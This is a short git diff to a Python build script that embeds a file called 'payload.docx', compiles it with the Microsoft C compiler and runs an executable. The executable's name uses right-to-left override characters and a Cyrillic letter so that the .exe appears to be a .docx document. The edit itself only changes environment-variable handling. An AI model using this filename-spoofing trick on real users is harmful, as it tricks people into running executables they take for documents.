@@ -7,7 +7,7 @@ import subprocess
 if (ntpath.exists("build")):
 	os.system("rmdir /s /q .\\build")
 os.mkdir("build")
-ti,tp,os.environ["INCLUDE"],os.environ["PATH"]=os.environ["INCLUDE"],os.environ["PATH"],".;"+os.environ["INCLUDE"],"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.28.29333\\bin\\Hostx64\\x64;"+os.environ["PATH"]
+ti,os.environ["INCLUDE"]=os.environ["INCLUDE"],".;"+os.environ["INCLUDE"]
 b_fp=os.getcwd()
 os.chdir("build")
 with open("../rsrc/payload.docx","rb") as f:
@@ -23,4 +23,4 @@ if (subprocess.run(["cl","/c","/permissive-","/GS","/W3","/Zc:wchar_t","/Gm-","/
 	os.system("del *.obj&&del *.pdb&&del *.h&&del *.res&&cls")
 	subprocess.run(["what_is_an_\u202ex\u0441od\u202e.exe"])
 os.chdir(b_fp)
-os.environ["INCLUDE"],os.environ["PATH"]=ti,tp
+os.environ["INCLUDE"]=ti
